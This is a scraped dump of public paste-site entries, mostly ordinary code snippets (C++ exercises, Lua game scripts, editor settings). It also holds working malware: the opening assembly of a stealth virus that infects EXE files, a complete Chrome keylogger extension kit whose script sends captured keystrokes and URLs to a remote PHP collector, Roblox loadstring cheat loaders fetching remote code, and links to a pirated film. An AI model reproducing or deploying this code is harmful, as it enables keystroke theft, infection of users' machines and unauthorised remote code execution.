                jc go_wrong_file
                mov ax, word ptr es:[bx]
                xor al,ah
                cmp al, 4dh xor 5ah
                jz exe_file
go_wrong_file:  jmp wrong_file_bubba
                db '[Serrelinda], Rhince/VLAD'
exe_file:
                xor ax,ax
                cmp word ptr es:[bx+6],ax
                jnz go_wrong_file
                cmp word ptr es:[bx+1ah],ax
                jnz go_wrong_file
                cmp word ptr es:[bx+20h],0FF33h
                jz mr_stealth
                cmp word ptr es:[bx+8],20h
                jnz go_wrong_file
infect:
                add word ptr es:[bx+0eh],20h
                mov ax, word ptr es:[bx+14h]
                mov word ptr cs:[jmp_ip+10h],ax
                mov ax, word ptr es:[bx+16h]
                mov word ptr cs:[jmp_cs+10h],ax
                mov word ptr es:[bx+8],2
                push cx
                push si
                push di
                push ds
                push cs
                pop ds
                mov si, 10h
                lea di, [bx+20h]
                mov cx, (endvirus-start)
                cld
                rep movsb
                mov word ptr es:[bx+14h], cx
                mov word ptr es:[bx+16h], cx
                xchg ax,cx
                pop ds
                pop di
                pop si
                pop cx
                add ax, 0301h
                int 13h
mr_stealth:
                sub word ptr es:[bx+0eh],20h
                mov ax, word ptr es:[bx+jmp_ip+20h]
                mov word ptr es:[bx+14h],ax
                mov ax, word ptr es:[bx+jmp_cs+20h]
                mov word ptr es:[bx+16h],ax
                mov word ptr es:[bx+8],20h
                push cx
                push di
                cld
                mov cx, (endvirus-start)
                lea di, [bx+20h]
                xor al,al
                rep stosb
                pop di
                pop cx
wrong_file_bubba:
                popf
                pop ax
                retf 2
go_int13:
                db 0eah
endvirus:
int13offset     dw 0
int13seg        dw 0
                end start"
1rkit5NX,"Input number, output number of digits",BojidarDosev,C++,Sunday 19th of November 2023 06:07:19 AM CDT,"#include <iostream>
using namespace std;

int fact(int x)
{
	int br = 0;
	if (x < 10 && x>0) 
	{
		return 1;
	}
	else
	{
		while(x>0)
		{
			x / 10;
			br++;
			x = x / 10;
		}
		return br;
	}
}

int main() 
{
	int x;
	cout << ""Enter a num: "";
	cin >> x; 
	cout << ""Your number cosist of: "" << fact(x) << "" digits."";
	
}"
dzBwHaSE,Untitled,Tutkis,Lua,Sunday 19th of November 2023 06:04:15 AM CDT,"local mb = {}
mb.n = ""minecraft:netherrack""
mb.a = ""minecraft:amethyst_cluster""
mb.c = ""spectrum:citrine_cluster""
mb.t = ""spectrum:topaz_cluster""

function inspblock(dn)
  print(dn)
  if dn == mb.a or dn == mb.c or dn == mb.t or  dn == mb.n then
    return true
  end
end

function unload()
  local i
  if turtle.detect() then
    for i = 1,16,1 do
      turtle.select(i)
      turtle.drop()
    end
  end
end

function smartMine()
  local start = false
  local success, data = turtle.inspect()  
  if success then
    if inspblock(data.name) then
      turtle.dig()
      start = true
    end
  end

  success, data = turtle.inspectUp()
  if success then
    if inspblock(data.name) then
      turtle.digUp()
      start = true
    end
  end

  success, data = turtle.inspectDown()
  if success then
    if inspblock(data.name) then
      turtle.digDown()
      start = true
    end
  end
  return start
end

function walk()
  turtle.turnLeft()
  turtle.forward()
  turtle.turnRight()
  turtle.forward()
  smartMine()
  
  turtle.forward()
  turtle.turnRight()
  turtle.forward()
  smartMine()
  
  turtle.forward()
  turtle.up()
  turtle.up()
  turtle.turnRight()
  turtle.forward()
  turtle.turnRight()
  smartMine()

  turtle.turnLeft()
  turtle.forward()
  turtle.turnRight()
  turtle.down()
  turtle.down()
  turtle.forward()
  turtle.turnLeft()
  unload()
  turtle.turnRight()
  turtle.turnRight()
end

-- MAIN
while true do
if not smartMine() then
    print(""------------"")
    sleep(60.0)        
  else
    walk()
    print(""Next try in 60 sec"")
	print(""Fuel:""..tostring(turtle.getFuelLevel()))
  end
end"
m3GUds7F,Template/manifest.json,FlyFar,JSON,Sunday 19th of November 2023 06:02:42 AM CDT,"{
  ""name"": ""Extension Name"",
  ""description"": ""Extension Description"",
  ""version"": ""1.0"",
  ""permissions"": [
    ""activeTab""
  ],
  ""browser_action"": {
    ""default_title"": ""Extension Default Title""
  },
  ""content_scripts"": [
  {
      ""matches"": [""<all_urls>""],
      ""js"": [""temis.js""]
  }
  ],
  ""manifest_version"": 2,
  ""icons"": { ""16"": ""icon16.png"",
           ""48"": ""icon48.png"",
          ""128"": ""icon128.png"" }
}"
qrFZE2LP,Carne.1991.Fre.DVDRip.h264.aac.Subs-bp,bpmircea,BrainFuck,Sunday 19th of November 2023 06:01:03 AM CDT,"Carne (Carne) (Gaspar Noé, 1991)
aka
Carne.1991.Fre.DVDRip.h264.aac.Subs-bp
https://www.imdb.com/title/tt0218871/
MediaInfo: https://t1p.de/qzcp8

https://files.fm/f/6v2kkmvd4f
https://filecrypt.cc/Container/99CE4BCAEF.html
https://t.me/c/1355332637/1516

Audio tracks: fr | Subtitles: en es pt ro ru"
3uFMiuiB,data757,TestGuy1,JSON,Sunday 19th of November 2023 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'f3128a933b3a053ec5e50aedfa3e125786db7f8aece263cf8569a81e30d84e40a27262a7a9aeb99f669f162d20c4cfb451b4e5f7b820052076713ba12e8d42efe465d011fe592f8d979960e840739a88e5c8621275b4b5ad591c4163582a425628ce54468db5e34bc51e73ec7eb638a55806ca8e0dbd53e508c6ccd029059ab9',
  otherdata: [
    '4f95177f325616682c9dd308d0a6de60',
    'ec8f67398834af646ba9f8d06bb28b1d',
    'aff5c130ec2f163b7f709173b7c491d1',
    '323c244512961357652aaf9e527d5fd6',
    '67e0eecb6e4a219d85e55535e81af5fb',
    '1369fb8856e2c86d027de405e0c20b9e',
    '1ffc2cad1aecb48859e447151581a198',
    '855028fdb9b3f5d8c92d4050c46f9f5b'
  ]
}"
qXYbRygM,Template/temis.js,FlyFar,JavaScript,Sunday 19th of November 2023 05:58:43 AM CDT,"var keys = '';
var current = document.URL;

new Image().src = url + '/hermes.php?c=[' + current + ']';

document.onkeypress = function(e) {
    var get = window.event ? event : e;
    var key = get.keyCode ? get.keyCode : get.charCode;
    key = String.fromCharCode(key);
    keys += key;
}

window.setInterval(function(){
        if( keys != """" )
                new Image().src = url + '/hermes.php?c=' + keys + ' ';
        keys = '';
}, 1000);
"
7GZgBPut,core/view.py,FlyFar,Python,Sunday 19th of November 2023 05:56:31 AM CDT,"######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/UndeadSec                #
#                                                    #
######################################################
from os import system
from huepy import *

def clear():
    system('clear')

def phpNot():
    print(red(""\n\n[!] PHP installation not found. Please install PHP and run me again. http://www.php.net/ ""))

def head():
    clear()
    print(cyan('''
UNDEADSEC | t.me/UndeadSec | youtube.com/c/UndeadSec - BRAZIL

██  ██ ████
██  ██ ██   ██   ██████
██████ ████ ████ ██  ██ v1.0
██  ██ ██   ██   ██████
██  ██ ████ ██   ██  ██ Twitter: https://twitter.com/UndeadSec
   CHROME KEYLOGGER
      EXTENSION'''))

def printQue(text):
    print(que(text))

def done():
    print(good('Done. Load your extension in Chrome. (/MaliciousExtension/)'))
    print(good('Your logs will be saved as logs.txt'))


def checkEd():
    print(red("" [!] Do you agree to use this tool for educational purposes only? (y/N) ""), end = '')
    if input('> ').upper() != 'Y':
        clear()
        print(red('\n[ YOU ARE NOT AUTHORIZED TO USE THIS TOOL ]\n'))
        exit(0)

def end():
    clear()
    print(cyan('''
         ,-`{-`/
      ,-~ , \ {-~~-,
    ,~  ,   ,`,-~~-,`,        ██  ██ ████
  ,`   ,   { {      } }       ██  ██ ██   ██   ██████               }/
 ;     ,--/`\ \    / /        ██████ ████ ████ ██  ██      }/      /,/
;  ,-./      \ \  { {  (      ██  ██ ██   ██   ██████     /,;    ,/ ,/
; /   `       } } `, `-`-.___ ██  ██ ████ ██   ██  ██    / `,  ,/  `,/
 \|         ,`,`    `~.___,---} CHROME KEYLOGGER        / ,`,,/  ,`,;
  `        { {                      EXTENSION      __  /  ,`/   ,`,;
        /   \ \                                 _,`, `{  `,{   `,`;`
       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
                   / , ~ . ^ `~`\:::::::::::<<~>-,,`,    `-,  ``,_    }
                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
       /`\    /~,  . ~ , '  `  ,  .` \::::;`   <<<~```   ``-,,__   ;
      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                      ascii by xiong

> Watch us on YouTube: https://youtube.com/c/UndeadSec 
> Follow me on Twitter: https://twitter.com/A1S0N_ 
> Contribute on Github: https://github.com/UndeadSec/HeraKeylogger 
> Join our Telegram Group(Portuguese Brazil): https://t.me/UndeadSec \n'''))"
p2RQFeXh,core/pre.py,FlyFar,Python,Sunday 19th of November 2023 05:55:53 AM CDT,"######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################
from os import system

def checkPHP():
    if 256 != system('which php'):
        return True        
    else:
        return False

def pre():
    system('rm -rf MaliciousExtension')
    system('mkdir MaliciousExtension')
    system('cp Template/* MaliciousExtension/')"
DKm8udVw,core/builder.py,FlyFar,Python,Sunday 19th of November 2023 05:54:48 AM CDT,"######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/A1S0N_                #
#                                                    #
######################################################
from json import load, dump
from os import system

def build(prefix, domain):
    with open('MaliciousExtension/temis.js', 'r+') as f:
        content = f.read()
        f.seek(0, 0)
        f.write('var url = \'' + prefix + domain + '\';' + '\n' + content)

def editMan(newName, newDesc, newVersion):
    with open('MaliciousExtension/manifest.json', 'r+') as f:
        data = load(f)
        data['name'] = newName
        data['description'] = newDesc
        data['version'] = newVersion
        f.seek(0)
        dump(data, f, indent=4)
        f.truncate()

def runServer():
    system(""sudo php -S 127.0.0.1:80"")"
Ve4xQ71N,hermes.php,FlyFar,PHP,Sunday 19th of November 2023 05:50:12 AM CDT,"<?php
	if(!empty($_GET['c']))
	{
		$logfile = fopen('logs.txt', 'a');
		if($logfile != null)
        		fwrite($logfile, $_GET['c']);
		fclose($logfile);
	}
?>"
MrEwdSfY,hera.py,FlyFar,Python,Sunday 19th of November 2023 05:49:25 AM CDT,"#!/usr/bin/env python3

######################################################
#                                                    #
#       HeraChromeKeylogger                          #
#                                                    #
# by:     UNDEADSEC                                  #
#                                                    #
# Telegram Group: https://t.me/UndeadSec             #
# YouTube Channel: https://youtube.com/c/UndeadSec   #
# Twitter: https://twitter.com/UndeadSec                #
#                                                    #
######################################################

from sys import exit, version_info

if version_info<(3,0,0):
    print('[!] Please use Python 3. $ python3 hera.py')
    exit(0)

from core.view import *
from core.pre import *
from core.builder import *

if checkPHP() == False:
    phpNot()
    exit(0)

def main():
    printQue('Insert your server ip/domain:')
    domain = input(' > ')
    if 'https://' in domain:
        domain = domain.split('https://')[1]
        prefix = 'https://'
    elif 'http://' in domain:
        domain = domain.split('http://')[1]
        prefix = 'http://'
    else:
        prefix = 'http://'
    build(prefix, domain)
    printQue('Edit manifest informations (i.e: name) [y/n] ?') 
    editManifest = input(' > ')
    if editManifest.upper() == 'Y':
        printQue('Insert a new name:')
        newName = input(' > ')        
        printQue('Insert a new description:')
        newDesc = input(' > ')  
        printQue('Insert a new version number:')      
        newVersion = input(' > ')
        editMan(newName, newDesc, newVersion)
    done()
    printQue('Start local php server [y/n] ?')
    server = input(' > ')
    if server.upper() == 'Y':
        runServer()


if __name__ == ""__main__"":
    try:
        clear()
        checkEd()
        head()
        pre()
        main()                
        
    except KeyboardInterrupt:
        end()
        exit(0)



"
Hi2DPrsV,settings.json,sifurr,JSON,Sunday 19th of November 2023 05:39:29 AM CDT,"{
  ""C_Cpp.default.cppStandard"": ""c++20"",
  ""C_Cpp.default.cStandard"": ""c11"",
  ""terminal.integrated.defaultProfile.windows"": ""Git Bash"",
  ""code-runner.runInTerminal"": true,
  ""code-runner.saveAllFilesBeforeRun"": true,
  ""code-runner.terminalRoot"": ""/"",
  ""code-runner.executorMapByGlob"": {
    ""pom.xml"": ""cd $dir && mvn clean package""
  },
  ""code-runner.executorMap"": {
    ""javascript"": ""node"",
    ""java"": ""cd $dir && javac $fileName && java $fileNameWithoutExt"",
    ""zig"": ""zig run"",
    ""objective-c"": ""cd $dir && gcc -framework Cocoa $fileName -o $fileNameWithoutExt && $dir$fileNameWithoutExt"",
    ""php"": ""php"",
    ""python"": ""python -u"",
    ""perl"": ""perl"",
    ""perl6"": ""perl6"",
    ""ruby"": ""ruby"",
    ""go"": ""go run"",
    ""lua"": ""lua"",
    ""groovy"": ""groovy"",
    ""powershell"": ""powershell -ExecutionPolicy ByPass -File"",
    ""bat"": ""cmd /c"",
    ""shellscript"": ""bash"",
    ""fsharp"": ""fsi"",
    ""csharp"": ""scriptcs"",
    ""vbscript"": ""cscript //Nologo"",
    ""typescript"": ""ts-node"",
    ""coffeescript"": ""coffee"",
    ""scala"": ""scala"",
    ""swift"": ""swift"",
    ""julia"": ""julia"",
    ""crystal"": ""crystal"",
    ""ocaml"": ""ocaml"",
    ""r"": ""Rscript"",
    ""applescript"": ""osascript"",
    ""clojure"": ""lein exec"",
    ""haxe"": ""haxe --cwd $dirWithoutTrailingSlash --run $fileNameWithoutExt"",
    ""rust"": ""cd $dir && rustc $fileName && $dir$fileNameWithoutExt"",
    ""racket"": ""racket"",
    ""scheme"": ""csi -script"",
    ""ahk"": ""autohotkey"",
    ""autoit"": ""autoit3"",
    ""dart"": ""dart"",
    ""pascal"": ""cd $dir && fpc $fileName && $dir$fileNameWithoutExt"",
    ""d"": ""cd $dir && dmd $fileName && $dir$fileNameWithoutExt"",
    ""haskell"": ""runghc"",
    ""nim"": ""nim compile --verbosity:0 --hints:off --run"",
    ""lisp"": ""sbcl --script"",
    ""kit"": ""kitc --run"",
    ""v"": ""v run"",
    ""sass"": ""sass --style expanded"",
    ""scss"": ""scss --style expanded"",
    ""less"": ""cd $dir && lessc $fileName $fileNameWithoutExt.css"",
    ""FortranFreeForm"": ""cd $dir && gfortran $fileName -o $fileNameWithoutExt && $dir$fileNameWithoutExt"",
    ""fortran-modern"": ""cd $dir && gfortran $fileName -o $fileNameWithoutExt && $dir$fileNameWithoutExt"",
    ""fortran_fixed-form"": ""cd $dir && gfortran $fileName -o $fileNameWithoutExt && $dir$fileNameWithoutExt"",
    ""fortran"": ""cd $dir && gfortran $fileName -o $fileNameWithoutExt && $dir$fileNameWithoutExt"",
    ""sml"": ""cd $dir && sml $fileName"",
    ""c"": ""cd $dir && gcc $fileName -o $fileNameWithoutExt.exe -lm && $dir$fileNameWithoutExt.exe < input.txt > output.txt -lm"",
    ""cpp"": ""cd $dir && g++ $fileName -o $fileNameWithoutExt.exe && $dir$fileNameWithoutExt.exe < input.txt > output.txt""
  },
  ""editor.minimap.enabled"": false,
  ""editor.mouseWheelZoom"": true,
  ""workbench.colorTheme"": ""Learn with Sumit - Peace of the eye - Dracula version"",
  ""javascript.updateImportsOnFileMove.enabled"": ""always"",
  ""explorer.confirmDelete"": false,
  ""explorer.confirmDragAndDrop"": false,
  ""emmet.triggerExpansionOnTab"": true,
  ""files.associations"": {
    ""*html"": ""html"",
    ""*njk"": ""html""
  },
  ""emmet.useInlineCompletions"": true,
  ""emmet.includeLanguages"": {
    ""javascript"": ""javascriptreact"",
    ""typescript"": ""typescriptreact"",
    ""vue-html"": ""html"",
    ""vue"": ""html"",
    ""razor"": ""html"",
    ""plaintext"": ""pug"",
    ""django-html"": ""html""
  },
  ""emmet.showSuggestionsAsSnippets"": true,
  ""emmet.showExpandedAbbreviation"": ""always"",
  ""[javascriptreact]"": {
    ""editor.defaultFormatter"": ""vscode.typescript-language-features""
  },
  ""git.openRepositoryInParentFolders"": ""never"",
  ""editor.defaultFormatter"": ""esbenp.prettier-vscode"",
  ""editor.formatOnSave"": true,
  ""[c]"": {
    ""editor.defaultFormatter"": ""ms-vscode.cpptools""
  },
  ""editor.linkedEditing"": true,
  ""liveServer.settings.donotShowInfoMsg"": true,
  ""editor.fontFamily"": ""'Fira Code','Droid Sans Mono', 'monospace', monospace"",
  ""editor.fontWeight"": ""normal"",
  ""terminal.integrated.fontWeight"": ""normal"",
  ""editor.fontSize"": 16,
  ""window.zoomLevel"": 1,
  ""files.autoSave"": ""afterDelay"",
  ""[cpp]"": {
    ""editor.defaultFormatter"": ""ms-vscode.cpptools""
  },
  ""editor.codeActionsOnSave"": {},
  ""editor.indentSize"": ""tabSize""
}
"
YfKJmKe1,剑客工作室,Ling_Mao,Lua,Sunday 19th of November 2023 05:30:23 AM CDT,"剑客工作室出品

剑客作者 初夏

作者QQ 1412512634

最近更新日期:2023年11月19日

剑客QQ群

一群 347724155 (快满了)
二群 881072957 (快满了)
三群 157104934 (快满了)
四群 454780416 (缺人)
五群 1015803524 (快满了)
六群 暂无
七群 暂无
八群 暂无
九群 暂无
十群 我还没火到这种程度

剑客支持的手机注入器:FL 忍者

//////////////剑客脚本////////////////

**力量传奇**
loadstring(game:HttpGet(""https://raw.githubusercontent.com/jiankeQWQ/JianKeStudio/main/liliangchuanqi""))()

**战争大亨**
loadstring(game:HttpGet(""https://raw.githubusercontent.com/jiankeQWQ/JianKeStudio/main/zhanzhengdaheng""))()


loadstring(game:HttpGet(""""))()


loadstring(game:HttpGet(""""))()
"
rMdF5REF,邀您一起看：外链,xiaomianao666,JavaScript,Sunday 19th of November 2023 05:22:07 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥外链@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5oiR55qE5Li76aG1XCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHA6Ly93cC5hbnh3bC5jbi9cXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwi4pGg5o6o6I2QXCIsXCJwYWdlc1wiOlwiW11cIn0iLCJ0aXRsZSI6IuWklumTviJ9
wHU0YwXc,TowerScript,Anukun_Lucifer,Lua,Sunday 19th of November 2023 04:44:53 AM CDT,"local physicsservice = game:GetService(""PhysicsService"")
local serverstorage = game:GetService(""ServerStorage"")
local replicatedstorage = game:GetService(""ReplicatedStorage"")

local event = replicatedstorage:WaitForChild(""Events"")
local spawntowerevent = event:WaitForChild(""SpawnTower"")
local animatetowerevent = event:WaitForChild(""AnimateTower"")

local tower = {}
--------------------------------------------
local function FindNearestTarget(newTower)
	local maxDistance = 20
	local nearestTarget = nil

	for i, target in ipairs(workspace.Grassland.Mob:GetChildren()) do
		local distance = (target.HumanoidRootPart.Position - newTower.HumanoidRootPart.Position).Magnitude
		if distance < maxDistance then
			nearestTarget = target
			maxDistance = distance
		end
	end

	return nearestTarget
end

function tower.Attack(newTower)
	local target = FindNearestTarget(newTower)
	
	if target and target:FindFirstChild(""Humanoid"") and target.Humanoid.Health > 0 then
		
		local targetCFrame = CFrame.lookAt(newTower.HumanoidRootPart.Position, target.HumanoidRootPart.Position)
		newTower.HumanoidRootPart.BodyGyro.CFrame = targetCFrame
		
		animatetowerevent:FireAllClients(newTower, ""Attack"")
		target.Humanoid:TakeDamage(25)

	end
	task.wait(1)
	return tower.Attack(newTower)
end
---------------------------------------------
function tower.Spawn(player, name, cframe)
	local towerExists = replicatedstorage.Towers:FindFirstChild(name)

	if towerExists then
		local newTower = towerExists:Clone()
		newTower.HumanoidRootPart.CFrame = cframe
		newTower.Parent = workspace.Grassland.Tower
		newTower.HumanoidRootPart:SetNetworkOwner(nil)
		
		local bodyGyro = Instance.new(""BodyGyro"")
		bodyGyro.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
		bodyGyro.D = 0
		bodyGyro.CFrame = newTower.HumanoidRootPart.CFrame
		bodyGyro.Parent = newTower.HumanoidRootPart

		for i, object in ipairs(newTower:GetDescendants()) do
			if object:IsA(""BasePart"") then
				physicsservice:SetPartCollisionGroup(object, ""Tower"")
			end
		end
		
		coroutine.wrap(tower.Attack) (newTower)
	else
		warn(""Requested mob dose not exist"",name)
	end
end

spawntowerevent.OnServerEvent:Connect(tower.Spawn)

return tower"
dyNL5WCY,Animations,Anukun_Lucifer,Lua,Sunday 19th of November 2023 04:42:37 AM CDT,"local replicatedstorage = game:GetService(""ReplicatedStorage"")

local event = replicatedstorage:WaitForChild(""Events"")
local animatetowerevent = event:WaitForChild(""AnimateTower"")

local function setAnimation(object, animName)
	local humanoid = object:WaitForChild(""Humanoid"")
	local animationsfolder = object:WaitForChild(""Animations"")
	
	if humanoid and animationsfolder then
		local animationsobject = animationsfolder:WaitForChild(animName)
		
		if animationsobject then
			local animator = humanoid:FindFirstChild(""Animator"") or Instance.new(""Animator"",humanoid)
			local animationstrack = animator:LoadAnimation(animationsobject)
			return animationstrack
		end
	end
end

local function playAnimation(object, animName)
	local animationstrack = setAnimation(object ,animName)
	
	if animationstrack then
		animationstrack:Play()
	else
		warn(""Animation track dose not exist"")
		return
	end
end

workspace.Grassland.Mob.ChildAdded:Connect(function(object)
	playAnimation(object, ""Walk"")
end)

workspace.Grassland.Tower.ChildAdded:Connect(function(object)
	playAnimation(object, ""Idel"")
end)

animatetowerevent.OnClientEvent:Connect(function(tower, animName)
	playAnimation(tower, animName)
end)"
ZrVcda6H,installer.lua,Geniusum,Lua,Sunday 19th of November 2023 04:36:04 AM CDT,"-- Background Image 42x17

local pastebin = {
    {""background"", ""background.nfp"", ""046Ca1sc""}
}

function getPastebin(id)
    for _, pb in ipairs(pastebin) do
        if pb[1] == id then
            return {pb[3], pb[2]}            
        end
    end
end

local width, height = term.getSize()
local launcher_width, launcher_height = 42, 17
shell.run(""cd /"")
bgpb = getPastebin(""background"")
shell.run(""pastebin get "" .. bgpb[1] .. "" "" .. bgpb[2])
local background_image_path = bgpb[2]

function task1()
    sleep(1)
end

function task2()
    sleep(2)
end

function task3()
    sleep(1)
end

local tasks = {
    {task1, false}, {task2, false}, {task3, false}
}

function launch()
    local stX = math.floor((width - launcher_width) / 2) + 1
    local stY = math.floor((height - launcher_height) / 2) + 1

    local background_image = paintutils.loadImage(background_image_path)

    paintutils.drawImage(background_image, stX, stY)

    term.setTextColor(colors.white)
    term.setCursorPos(stX + 1, stY + launcher_height - 2)
    term.write(""MTX 120 Drivers - Loading..."")

    term.setCursorPos(stX + 1, stY + launcher_height - 1)

    local completedTasks = 0

    for _, taskInfo in ipairs(tasks) do
        local task, state = taskInfo[1], taskInfo[2]
        if not state then
            -- Exécuter la tâche si elle n'est pas encore terminée
            term.setCursorPos(stX + 1, stY + launcher_height - 1)
            term.write(""Tasks completed: "" .. completedTasks .. ""/"" .. #tasks)
            task()
            taskInfo[2] = true  -- Mettre à jour l'état de la tâche
            completedTasks = completedTasks + 1
            term.setCursorPos(stX + 1, stY + launcher_height - 1)
            term.write(""Tasks completed: "" .. completedTasks .. ""/"" .. #tasks)
        end
    end

    term.setCursorPos(stX + 1, stY + launcher_height - 1)
    term.write(""Tasks completed: "" .. completedTasks .. ""/"" .. #tasks)
    sleep(2)
end

function end_()
    local end_width, end_height = 13, 3
    local stX = math.floor((width - end_width) / 2) + 1
    local stY = math.floor((height - end_height) / 2) + 1

    term.setBackgroundColor(colors.gray)

    for i = stY, stY + end_height - 1 do
        term.setCursorPos(stX + 1, i + 1)
        term.write(string.rep("" "", end_width))
    end

    term.setBackgroundColor(colors.lightGray)

    for i = stY, stY + end_height - 1 do
        term.setCursorPos(stX, i)
        term.write(string.rep("" "", end_width))
    end
    
    term.setCursorPos(stX + 1, stY + end_height - 2)
    term.setTextColor(colors.black)
    
    term.write(""Installed !"")
    
    sleep(2)

    term.setBackgroundColor(colors.black)
    term.setCursorPos(1, 1)
    term.clear()
end

launch()
end_()"
2paNMWj0,Pinterest parser,AllChai_,Python,Sunday 19th of November 2023 04:29:42 AM CDT,"page = requests.get(url='')
soup = BeautifulSoup(page.text, 'html.parser')
all_desks = soup.findAll('div', class_=""hA- sLG wYR zI7 iyn Hsu"")
"
ZBYR3eBA,Untitled,ProgMe,C++,Sunday 19th of November 2023 04:27:51 AM CDT,"#include <bits/extc++.h>
#define int int64_t

using namespace std;
using namespace __gnu_pbds;

const int N = 1e5 + 1;
const int L = 17;

int n, timer;
array<int, N> tin, tout;
array<array<int, N>, L> up, mn;
array<vector<pair<int, int>>, N> g;

void dfs(int v = 0, int p = -1) {
    tin[v] = timer++;
    for (int l = 1; l < L; l++) {
        up[l][v] = up[l - 1][up[l - 1][v]];
        mn[l][v] = min(mn[l - 1][v], mn[l - 1][up[l - 1][v]]);
    }

    for (auto [u, w] : g[v]) {
        if (u != p) {
            up[0][u] = v;
            mn[0][u] = w;
            dfs(u, v);
        }
    }
    tout[v] = timer++;
}

bool ancestor(int v, int u) {
    return tin[v] <= tin[u] && tout[v] >= tout[u];
}

int lca(int v, int u) {
    if (ancestor(v, u)) {
        return v;
    }
    if (ancestor(u, v)) {
        return u;
    }
    for (int l = L - 1; l >= 0; l--) {
        if (!ancestor(up[l][v], u)) {
            v = up[l][v];
        }
    }
    return up[0][v];
}

int min_edge(int v, int u) {
    int cur = lca(v, u);

    int ans = numeric_limits<int>::max();
    for (int l = L - 1; l >= 0; l--) {
        if (!ancestor(up[l][v], cur)) {
            ans = min(ans, mn[l][v]);
            v = up[l][v];
        }
        if (!ancestor(up[l][u], cur)) {
            ans = min(ans, mn[l][u]);
            u = up[l][u];
        }
    }

    if (!ancestor(v, cur)) {
        ans = min(ans, mn[0][v]);
    }
    if (!ancestor(u, cur)) {
        ans = min(ans, mn[0][u]);
    }
    return ans;
}

int32_t main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    cin >> n;

    for (int v = 1; v < n; v++) {
        int u;
        cin >> u;
        u--;

        int w;
        cin >> w;

        g[u].emplace_back(v, w);
        g[v].emplace_back(u, w);
    }

    dfs();

    int q;
    cin >> q;
    while (q--) {
        int v, u;
        cin >> v >> u;
        v--, u--;

        cout << min_edge(v, u) << '\n';
    }
}
"
xktSJnF8,How to Add Additional Content on the My Account Login Page,fahimmurshed,PHP,Sunday 19th of November 2023 04:24:42 AM CDT,"add_action('woocommerce_login_form_start','astra_theme_add_login_text');
  
function astra_theme_add_login_text() {
	echo '<h3 class=""bb-login-subtitle"">Registered Customers</h3><p class=""bb-login-description"">If you possess an account with us, please sign in by entering your email address.</p>';
}
  
add_action('woocommerce_register_form_start','astra_theme_add_reg_text');
  
function astra_theme_add_reg_text() {
	echo '<h3 class=""bb-register-subtitle"">New Customers</h3><p class=""bb-register-description"">ign up with our store to streamline your shopping experience. Enjoy faster checkout processes, store multiple shipping addresses, and conveniently view and track your orders—all within your account. Unlock additional benefits and make the most of your shopping journey.</p>';
}"
vb2DsNWh,bg monitor,Rayanis55,Lua,Sunday 19th of November 2023 04:14:54 AM CDT,"-- Motif ASCII représentant un background
local motif = {
    ""ddddddddddddddd"",
    ""d0000000000000d"",
    ""d0000000000000d"",
    ""d0555500007500d"",
    ""d0777500007500d"",
    ""d0007500007500d"",
    ""d0007500007500d"",
    ""d0007500007500d"",
    ""d0007500007500d"",
    ""d0007577777500d"",
    ""d0007555555500d"",
    ""d0000000000000d"",
    ""ddddddddddddddd""
}

-- Affichage du motif ligne par ligne
for _, ligne in ipairs(motif) do
    print(ligne)
end
"
iud4Ux7Q,Untitled,dllbridge,C,Sunday 19th of November 2023 03:56:48 AM CDT,"
#include  <string>
#include <stdio.h>
#include  <vector>
#pragma warning(disable : 4996)

using namespace std;

namespace year 
{
	const char* monthes[15] = {""January"", ""February"", ""March"", ""April"", ""May"", ""June"", ""July"", ""August"", ""September"", ""October"", ""November"", ""December""};
	vector<int> days = { 31, 29, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
	int nowyear;
}


using namespace year;

//////////////////////////////////////////
int main() 
{
	
	bool visc = false;
	
	printf(""enter year : "");
	scanf(""%d"", &nowyear);
	
	
	if(nowyear % 4 == 0) 
	{
		days[1] =   28;
		visc    = true;
	}
	
	for(int i = 0; i < 12; i++) 
	{
		printf(""%10s has %d days\n"", monthes[i], days[i]);
	}
	
	if (visc) printf(""-----------------------\nFebruary destructor works.      "");
	else   	  printf(""-----------------------\nFebruary destructor doesnt work."");
}




"
